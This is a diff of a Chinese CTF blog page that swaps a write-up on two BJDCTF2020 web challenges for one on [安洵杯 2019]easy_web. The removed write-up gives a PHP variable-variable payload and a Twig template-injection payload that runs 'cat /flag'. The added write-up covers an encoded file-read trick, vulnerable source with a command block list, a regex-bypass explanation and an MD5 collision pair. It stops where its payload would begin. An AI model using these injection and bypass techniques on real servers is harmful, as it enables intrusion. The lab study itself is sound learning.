@@ -16,37 +16,27 @@
   <meta name="author" content="TEhS">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[BJDCTF2020]Mark loves cat 一个很精美的界面，查看页面源码之后并没有发现什么，而页面上的多数按钮都是回到第一页的，没啥作用，这种情况下，一般就得试试存不存在源码泄漏或者git泄漏了，这里使用githack工具  找到两个文件可疑文件：  在githack目录下找到这两个文件：   代码中使用了可变变量 可变变量 用一段简单的代码便于理解，代码中，三个都将输出hello w">
+    <meta name="description" content="[安洵杯 2019]easy_web  页面源码提示这应该是一个md5相关的题，但除此之外没别的信息 抓包：  页面通过get方法读取了一个图片，应该就是左上角那个，对字符串进行base64解码 得到：MzUzNTM1MmU3MDZlNjc&#x3D; 再解码：3535352e706e67 16进制转字符：555.png 那么可以尝试用同样的方法获取index.php的源码： index.php转">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WebWriteUp8">
-<meta property="og:url" content="http://example.com/2024/02/22/WebWriteUp8/index.html">
+<meta property="og:title" content="WebWriteUp9">
+<meta property="og:url" content="http://example.com/2024/03/04/WebWriteUp9/index.html">
 <meta property="og:site_name" content="TEhS">
-<meta property="og:description" content="[BJDCTF2020]Mark loves cat 一个很精美的界面，查看页面源码之后并没有发现什么，而页面上的多数按钮都是回到第一页的，没啥作用，这种情况下，一般就得试试存不存在源码泄漏或者git泄漏了，这里使用githack工具  找到两个文件可疑文件：  在githack目录下找到这两个文件：   代码中使用了可变变量 可变变量 用一段简单的代码便于理解，代码中，三个都将输出hello w">
+<meta property="og:description" content="[安洵杯 2019]easy_web  页面源码提示这应该是一个md5相关的题，但除此之外没别的信息 抓包：  页面通过get方法读取了一个图片，应该就是左上角那个，对字符串进行base64解码 得到：MzUzNTM1MmU3MDZlNjc&#x3D; 再解码：3535352e706e67 16进制转字符：555.png 那么可以尝试用同样的方法获取index.php的源码： index.php转">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240222191833504.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240222193106747.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240222193127316.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240222193314861.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240222193335081.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240222201944624.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240223142215534.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240223143251197.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240223143301506.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240223155214230.png">
-<meta property="og:image" content="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911174631687-758048107.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240223155312248.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240223155355940.png">
-<meta property="og:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240223155644972.png">
-<meta property="article:published_time" content="2024-02-22T11:15:56.000Z">
-<meta property="article:modified_time" content="2024-02-23T08:07:22.270Z">
+<meta property="og:image" content="http://example.com/2024/03/04/WebWriteUp9/image-20240304145510477.png">
+<meta property="og:image" content="http://example.com/2024/03/04/WebWriteUp9/image-20240304145532989.png">
+<meta property="og:image" content="http://example.com/2024/03/04/WebWriteUp9/image-20240304145620647.png">
+<meta property="og:image" content="http://example.com/2024/03/04/WebWriteUp9/image-20240304150321950.png">
+<meta property="article:published_time" content="2024-03-04T06:54:08.000Z">
+<meta property="article:modified_time" content="2024-03-04T07:44:00.831Z">
 <meta property="article:author" content="TEhS">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2024/02/22/WebWriteUp8/image-20240222191833504.png">
+<meta name="twitter:image" content="http://example.com/2024/03/04/WebWriteUp9/image-20240304145510477.png">
   
   
   
-  <title>WebWriteUp8 - TEhS</title>
+  <title>WebWriteUp9 - TEhS</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -212,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="WebWriteUp8"></span>
+            <span id="subtitle" data-typed-text="WebWriteUp9"></span>
           
         </div>
 
@@ -223,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-02-22 19:15" pubdate>
-          2024年2月22日 晚上
+        <time datetime="2024-03-04 14:54" pubdate>
+          2024年3月4日 下午
         </time>
       </span>
     
@@ -235,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k 字
+          2.3k 字
         
       </span>
     
@@ -246,7 +236,7 @@
         
         
         
-          18 分钟
+          20 分钟
         
       </span>
     
@@ -283,75 +273,47 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">WebWriteUp8</h1>
+            <h1 id="seo-header">WebWriteUp9</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><img src="/2024/02/22/WebWriteUp8/image-20240222191833504.png" srcset="/img/loading.gif" lazyload alt="image-20240222191833504"></p>
-<p>一个很精美的界面，查看页面源码之后并没有发现什么，而页面上的多数按钮都是回到第一页的，没啥作用，这种情况下，一般就得试试存不存在源码泄漏或者git泄漏了，这里使用githack工具</p>
-<p><img src="/2024/02/22/WebWriteUp8/image-20240222193106747.png" srcset="/img/loading.gif" lazyload alt="image-20240222193106747"></p>
-<p>找到两个文件可疑文件：</p>
-<p><img src="/2024/02/22/WebWriteUp8/image-20240222193127316.png" srcset="/img/loading.gif" lazyload alt="image-20240222193127316"></p>
-<p>在githack目录下找到这两个文件：</p>
-<p><img src="/2024/02/22/WebWriteUp8/image-20240222193314861.png" srcset="/img/loading.gif" lazyload alt="image-20240222193314861"></p>
-<p><img src="/2024/02/22/WebWriteUp8/image-20240222193335081.png" srcset="/img/loading.gif" lazyload alt="image-20240222193335081"></p>
-<p>代码中使用了可变变量</p>
-<p><strong>可变变量</strong></p>
-<p>用一段简单的代码便于理解，代码中，三个都将输出hello world</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;<br><span class="hljs-variable">$$a</span> = <span class="hljs-string">&#x27;world&#x27;</span>; <span class="hljs-comment">//相当于创建了一个hello变量并赋值</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> <span class="hljs-subst">&#123;$$a&#125;</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> <span class="hljs-subst">$hello</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello world&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+                <h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p><img src="/2024/03/04/WebWriteUp9/image-20240304145510477.png" srcset="/img/loading.gif" lazyload alt="image-20240304145510477"></p>
+<p><img src="/2024/03/04/WebWriteUp9/image-20240304145532989.png" srcset="/img/loading.gif" lazyload alt="image-20240304145532989"></p>
+<p>页面源码提示这应该是一个md5相关的题，但除此之外没别的信息</p>
+<p>抓包：</p>
+<p><img src="/2024/03/04/WebWriteUp9/image-20240304145620647.png" srcset="/img/loading.gif" lazyload alt="image-20240304145620647"></p>
+<p>页面通过get方法读取了一个图片，应该就是左上角那个，对字符串进行base64解码</p>
+<p>得到：MzUzNTM1MmU3MDZlNjc&#x3D;</p>
+<p>再解码：3535352e706e67</p>
+<p>16进制转字符：555.png</p>
+<p>那么可以尝试用同样的方法获取index.php的源码：</p>
+<p>index.php转16进制：696e6465782e706870</p>
+<p>base64编码：Njk2ZTY0NjU3ODJlNzA2ODcw</p>
+<p>再编码：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p>
+<p>读取试试：</p>
+<p><img src="/2024/03/04/WebWriteUp9/image-20240304150321950.png" srcset="/img/loading.gif" lazyload alt="image-20240304150321950"></p>
+<p>得到一串字符，解码后得到一段php代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>那么进行代码审计</p>
-<ul>
-<li><p>第一个foreach会把所有的POST的参数值作为变量名创建对应的变量</p>
-<p>例如：传入flag&#x3D;flag，将会有$x &#x3D; flag, $y &#x3D; flag, $flag &#x3D; flag</p>
-</li>
-<li><p>第二个foreach会把所有的GET的参数值作为变量名创建对应的变量</p>
-</li>
-<li><p>第三个foreach用来检查GET的值中是否存在flag这个变量，但其本身不等于flag，若有，则输出hansome的值</p>
-</li>
-<li><p>第一个if用来判断GET和POST的传参不能有flag，这会儿输出yds</p>
-</li>
-<li><p>第二个if判断GET或POST的传参是否是flag，是的话输出is</p>
-</li>
-</ul>
-<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>利用get</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#传入的get值会经过这。例:传入is=flag，得到$is=$flag.</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;<br>&#125;<br><span class="hljs-comment">#用post或get传的参数必须是flag且值为flag</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>要面临3个挑战：</p>
+<ol>
+<li>包含的文件不能含有flag</li>
+<li>cmd参数能进行的命令注入大部分被过滤了</li>
+<li>需要POST两个参数，且这两个参数的md5值相等，而且这两个参数会被强制类型转换成string</li>
+</ol>
+<p>漏洞利用：</p>
+<p>注意正则表达式中的：|\\|\\\\|</p>
+<ol>
+<li>PHP 解析：<code>|\\|\\\\|</code> → <code>|\|\\|</code></li>
+<li>正则表达式解析：<code>|\|\\|</code> → <code>||\|</code></li>
+</ol>
+<p>所以最后这个合起来并不是过滤的\和\\，而是|\</p>
+<p>所以命令可以使用\进行关键词过滤的绕过，空格则用%20绕过</p>
+<p>对于md5，查阅资料，这个以后记住用就行：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br>b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure>
 
-<p>最后打印的是is，所以首先传入is&#x3D;flag，经过循环后，得到$x&#x3D;is,$y&#x3D;flag. 带进去变成$is&#x3D;$flag，也就是说在传入is&#x3D;flag后，就会有个flag变量，那么再传入flag&#x3D;flag，就能实现，且经过循环得到$flag&#x3D;$flag，不会影响</p>
-<p>所以payload为：&#x2F;?is&#x3D;flag&amp;flag&#x3D;flag</p>
-<p><img src="/2024/02/22/WebWriteUp8/image-20240222201944624.png" srcset="/img/loading.gif" lazyload alt="image-20240222201944624"></p>
-<p>在页面最下方得到flag</p>
-<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#传入的get值会经过这。例:传入is=flag，得到$is=$flag.</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;<br>&#125;<br><span class="hljs-comment">#get和post传参不能有flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>和第一种一样，这会儿需要get的参数不是flag，但构造yds&#x3D;flag，直接能绕过</p>
-<p>所以payload为：&#x2F;?yds&#x3D;flag</p>
-<p>此题中，若要利用hansome，需要传入flag !&#x3D; flag，相当于改变了flag的值，无法利用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-comment">#git传入flag变量且值不为flag</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="/2024/02/22/WebWriteUp8/image-20240223142215534.png" srcset="/img/loading.gif" lazyload alt="image-20240223142215534"></p>
-<p>flag界面</p>
-<p><img src="/2024/02/22/WebWriteUp8/image-20240223143251197.png" srcset="/img/loading.gif" lazyload alt="image-20240223143251197"></p>
-<p>hint界面</p>
-<p><img src="/2024/02/22/WebWriteUp8/image-20240223143301506.png" srcset="/img/loading.gif" lazyload alt="image-20240223143301506"></p>
-<p>既然题目提到cookie，那么先用admin登录，在页面刷新抓cookie</p>
-<p><img src="/2024/02/22/WebWriteUp8/image-20240223155214230.png" srcset="/img/loading.gif" lazyload alt="image-20240223155214230"></p>
-<p>既然存在一个POST值，那么尝试sql注入，但发现，输入啥就会回显啥，无法进行注入</p>
-<h4 id="ssti注入（模版注入）"><a href="#ssti注入（模版注入）" class="headerlink" title="ssti注入（模版注入）"></a><strong>ssti注入（模版注入）</strong></h4><p><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911174631687-758048107.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击者的目的。</p>
-<p>那么先进行注入测试，payload：49</p>
-<p><img src="/2024/02/22/WebWriteUp8/image-20240223155312248.png" srcset="/img/loading.gif" lazyload alt="image-20240223155312248"></p>
-<p>观察返回的内容，</p>
-<p><img src="/2024/02/22/WebWriteUp8/image-20240223155355940.png" srcset="/img/loading.gif" lazyload alt="image-20240223155355940"></p>
-<p>可以确定是服务器端类型</p>
-<p>根据上表，可以看到有smarty，twig</p>
-<p>那么进行尝试就行，网上找twig注入的模版，进行修改：</p>
-<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2024/02/22/WebWriteUp8/image-20240223155644972.png" srcset="/img/loading.gif" lazyload alt="image-20240223155644972"></p>
-<p>得到flag</p>
+<p>所以构造payload：</p>
 
                 
               </div>
@@ -397,8 +359,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>WebWriteUp8</div>
-      <div>http://example.com/2024/02/22/WebWriteUp8/</div>
+      <div>WebWriteUp9</div>
+      <div>http://example.com/2024/03/04/WebWriteUp9/</div>
     </div>
     <div class="license-meta">
       
@@ -410,7 +372,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年2月22日</div>
+          <div>2024年3月4日</div>
         </div>
       
       
@@ -442,18 +404,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/03/04/WebWriteUp9/" title="WebWriteUp9">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">WebWriteUp9</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/02/17/WebWriteUp7/" title="WebWriteUp7">
-                        <span class="hidden-mobile">WebWriteUp7</span>
+                      <a href="/2024/02/22/WebWriteUp8/" title="WebWriteUp8">
+                        <span class="hidden-mobile">WebWriteUp8</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
